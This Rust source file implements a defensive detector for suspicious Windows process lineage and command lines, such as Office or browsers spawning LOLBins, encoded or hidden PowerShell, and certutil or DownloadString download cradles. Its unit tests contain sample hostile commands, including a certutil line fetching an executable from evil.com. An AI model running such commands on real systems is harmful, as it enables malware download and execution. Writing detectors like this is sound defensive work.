#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AnomalyVerdict {
    SuspiciousParentChild { parent: String, child: String },
    SuspiciousCommandLine { reason: String },
    Benign,
}

const RISKY_PARENTS: &[&str] = &[
    "chrome.exe",
    "msedge.exe",
    "brave.exe",
    "firefox.exe",
    "acrord32.exe",
    "acrobat.exe",
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
];

const LOLBINS: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "mshta.exe",
    "wscript.exe",
    "cscript.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "regsvr32.exe",
    "rundll32.exe",
];

/// Checks if a parent process spawning a child process constitutes a known LOLBin / dropper anomaly.
pub fn check_process_lineage(parent_name: &str, child_name: &str) -> AnomalyVerdict {
    let p_lower = parent_name.to_lowercase();
    let c_lower = child_name.to_lowercase();

    let is_risky_parent = RISKY_PARENTS.iter().any(|&p| p_lower == p || p_lower.ends_with(p));
    let is_lolbin = LOLBINS.iter().any(|&l| c_lower == l || c_lower.ends_with(l));

    if is_risky_parent && is_lolbin {
        AnomalyVerdict::SuspiciousParentChild {
            parent: parent_name.to_string(),
            child: child_name.to_string(),
        }
    } else {
        AnomalyVerdict::Benign
    }
}

/// Inspects command-line arguments for hidden execution, base64 payloads, or stealth download cradles.
pub fn inspect_command_line(cmd: &str) -> AnomalyVerdict {
    let cmd_lower = cmd.to_lowercase();

    if cmd_lower.contains("-enc ") || cmd_lower.contains("-encodedcommand ") {
        return AnomalyVerdict::SuspiciousCommandLine {
            reason: "Base64 encoded execution payload detected".into(),
        };
    }

    if cmd_lower.contains("-w hidden") || cmd_lower.contains("-windowstyle hidden") {
        return AnomalyVerdict::SuspiciousCommandLine {
            reason: "Stealth hidden window execution flag detected".into(),
        };
    }

    if (cmd_lower.contains("certutil") && cmd_lower.contains("-urlcache"))
        || (cmd_lower.contains("downloadstring(") || cmd_lower.contains("invoke-webrequest"))
    {
        return AnomalyVerdict::SuspiciousCommandLine {
            reason: "Remote C2 staging download cradle detected".into(),
        };
    }

    AnomalyVerdict::Benign
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_process_lineage_anomaly() {
        assert_ne!(
            check_process_lineage("WINWORD.EXE", "powershell.exe"),
            AnomalyVerdict::Benign
        );
        assert_ne!(
            check_process_lineage("chrome.exe", "cmd.exe"),
            AnomalyVerdict::Benign
        );
        assert_eq!(
            check_process_lineage("explorer.exe", "notepad.exe"),
            AnomalyVerdict::Benign
        );
    }

    #[test]
    fn test_command_line_inspection() {
        assert_ne!(
            inspect_command_line("powershell.exe -w hidden -enc JABzID0A"),
            AnomalyVerdict::Benign
        );
        assert_ne!(
            inspect_command_line("certutil.exe -urlcache -split -f http://evil.com/x.exe"),
            AnomalyVerdict::Benign
        );
        assert_eq!(
            inspect_command_line("cargo build --release"),
            AnomalyVerdict::Benign
        );
    }
}
